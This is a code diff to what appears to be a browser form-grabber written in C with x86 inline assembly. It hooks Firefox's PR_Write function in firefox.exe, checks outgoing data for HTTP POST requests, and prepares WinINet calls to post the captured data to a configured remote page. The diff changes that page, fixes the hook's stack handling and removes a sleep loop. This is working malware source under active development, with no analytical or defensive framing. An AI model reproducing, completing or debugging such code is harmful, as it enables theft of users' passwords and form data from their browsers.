@@ -9,7 +9,7 @@
 #define HTTP_POST			"POST"
 #define HTTP_POST_HEADER	"Content-Type:application/x-www-form-urlencoded"
 #define HTTP_REMOTE_SITE	"localhost"
-#define HTTP_REMOTE_PAGE	"/hit.php"
+#define HTTP_REMOTE_PAGE	"/postDemo.php"
 
 #define FIREFOX_PROCESS		"firefox.exe"
 #define FIREFOX_PR_WRITE	"PR_Write"
@@ -28,6 +28,8 @@
 #define HOOK_INT3_SIZE			0x01
 #define HOOK_ADDRESS_SIZE		0x04
 #define HOOK_REL_JMP_OFFSET		(HOOK_JMP_INST_SIZE + HOOK_ADDRESS_SIZE)		// 5
+#define HOOK_PARAM1_OFFSET		0x08
+#define HOOK_LOCALVAR1_OFFSET	0x04
 
 #define PR_WRITE_JMP_VP_SIZE	0x06
 
@@ -135,18 +137,20 @@ Hooked:
 		cmp dword ptr[eax], HOOK_POST_CMP // POST?
 		jne prexJMP						// it is not POST
 										// it is POST
-		push ebp
-		mov ebp, esp
-		sub esp, 32
-		sub ebp, 16
-		push ecx
-		push eax
+		sub esp, HOOK_PARAM1_OFFSET		// Alloc space for pData
+										// this avoids overwriting PR_Write params with Hook param pData
+										// See http://www.unixwiz.net/techtips/win32-callconv-asm.html
+		push ebp						// Save ebp register
+		mov ebp, esp					// Place ebp at esp
+		sub esp, HOOK_LOCALVAR1_OFFSET 	// Alloc 4 bytes on stack for temp local variable
+		push ecx						// save param data size
+		push eax						// save param data
 		call getDelta4					// get the delta, &newtInstruction follows this call
 	getDelta4:
 		pop ecx							// return from call, saving the address at ecx
 		sub ecx, offset getDelta4
 		lea eax, data
-		add eax, ecx						// eax = &data + (&nextInstruction - &getDelta4) = &data
+		add eax, ecx					// eax = &data + (&nextInstruction - &getDelta4) = &data
 		mov eax,[eax]
 		mov pData, eax					// pData = *eax = *(&nextInstruction +(&data - &getDelta4))
 		pop eax				
@@ -173,9 +177,9 @@ Hooked:
 
 	__asm{ 
 		nop
-		add ebp, 16
-		add esp, 32
-		pop ebp
+		add esp, HOOK_LOCALVAR1_OFFSET	
+		pop ebp							// reset state of ebp and esp
+		add esp, HOOK_PARAM1_OFFSET
 		nop
 	}
 
@@ -296,10 +300,10 @@ start:
 	pData->fnOpenHandle = pData->fnInternetOpen( pData->remoteSite, INTERNET_OPEN_TYPE_PRECONFIG, NULL ,NULL, 0);
 
 	// Everything is done in the PR_Write thread when called
-	for(;;) 
-	{ 
-		pData->fnSleep(1000); 
-	}
+	// for(;;) 
+	// { 
+	// 	pData->fnSleep(1000); 
+	// }
 		
 
 }
